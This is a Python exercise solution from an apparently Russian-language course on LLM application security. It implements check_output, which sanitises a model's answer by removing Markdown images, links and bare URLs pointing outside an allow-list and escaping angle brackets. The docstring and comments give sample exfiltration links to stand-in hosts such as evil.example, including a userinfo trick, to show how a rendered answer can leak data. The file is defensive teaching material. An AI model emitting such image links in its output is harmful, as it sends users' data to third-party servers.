"""Задание 4. Выход: ответ модели — тоже недоверенный текст (глава III, LLM10).

Сейчас ответ уходит пользователю как есть. Если в нём Markdown-картинка
![](https://evil.example/c?d=...), клиент сам загрузит её и отправит данные на чужой сервер.

check_output(text, allowed_hosts) — вернуть безопасный вариант ответа:
  - Markdown-картинки ![alt](url) и ссылки [текст](url) с адресом ВНЕ allowed_hosts:
    картинку заменить на «[изображение удалено]», у ссылки оставить только текст;
  - «голые» адреса http(s)://... вне allowed_hosts заменить на «[ссылка удалена]»;
  - хост «внутри списка» — это сам хост или его поддомен (docs.company.example разрешает
    и sub.docs.company.example, но не evil-docs.company.example.attacker.com);
  - символы < и > заменить на &lt; и &gt;, чтобы ответ нельзя было вставить на страницу как HTML.
Используйте urllib.parse.urlparse(url).hostname.

Проверка: pytest tests/test_04_output.py
"""
import re
from urllib.parse import urlparse

IMAGE_REMOVED = "[изображение удалено]"
LINK_REMOVED = "[ссылка удалена]"

# Разбор Markdown-конструкций. У ссылки/картинки может быть титул: [текст](url "название")
# — его тоже нужно съесть, иначе он останется в ответе после отсечения адреса.
_TARGET = r"\(\s*([^)\s]+)(?:\s+[\"'][^\"']*[\"'])?\s*\)"
_MD_IMAGE = re.compile(r"!\[([^\]]*)\]" + _TARGET)
# Ссылка: картинка — это та же ссылка с «!» слева, поэтому её проверяем отдельно и раньше.
_MD_LINK = re.compile(r"(?<!\!)\[([^\]]*)\]" + _TARGET)
# «Голый» адрес: скобки не включаем, чтобы не съесть закрывающую скобку Markdown-ссылки.
_BARE_URL = re.compile(r"https?://[^\s<>()\[\]{}\"'`]+", re.I)

_SAFE_SCHEMES = {"http", "https"}


def _host_allowed(url: str, allowed_hosts: set) -> bool:
    """Разрешён ли адрес: только сам хост из списка или его поддомен."""
    try:
        parsed = urlparse(url)
    except ValueError:
        return False
    # Относительная ссылка (#раздел, /путь) никуда наружу не уходит — её трогать не нужно.
    if not parsed.scheme:
        return True
    if parsed.scheme.lower() not in _SAFE_SCHEMES:
        # javascript:, data:, file: — доверенного хоста у них нет и быть не может.
        return False
    # hostname, а не netloc: в netloc остаётся userinfo, и https://docs.company.example@evil.example/
    # выглядел бы «разрешённым», хотя запрос идёт на evil.example.
    host = (parsed.hostname or "").rstrip(".").lower()
    if not host:
        return False
    for allowed in allowed_hosts or ():
        base = str(allowed).rstrip(".").lstrip(".").lower()
        if base and (host == base or host.endswith("." + base)):
            return True
    return False


def _markdown_sub(kind: str, hosts: set):
    """Функция подстановки для Markdown-картинки или ссылки при данном списке хостов."""
    def _sub(m):
        label, url = m.group(1), m.group(2)
        if _host_allowed(url, hosts):
            return m.group(0)
        # У ссылки оставляем видимый текст, картинку убираем целиком: alt-текст не важнее
        # самого факта обращения к чужому серверу.
        return label if kind == "link" else IMAGE_REMOVED
    return _sub


def check_output(text: str, allowed_hosts: set) -> str:
    if not isinstance(text, str) or not text:
        return text if isinstance(text, str) else ""
    hosts = set(allowed_hosts or ())

    # Порядок важен: сначала картинки (иначе ссылка съест «[alt](url)» изнутри картинки),
    # потом ссылки, потом адреса, которые остались без скобок.
    out = _MD_IMAGE.sub(_markdown_sub("image", hosts), text)
    out = _MD_LINK.sub(_markdown_sub("link", hosts), out)
    out = _BARE_URL.sub(lambda m: m.group(0) if _host_allowed(m.group(0), hosts)
                       else LINK_REMOVED, out)

    # И последнее: ответ — тоже чужой текст, на страницу его вставляют уже экранированным.
    return out.replace("<", "&lt;").replace(">", "&gt;")
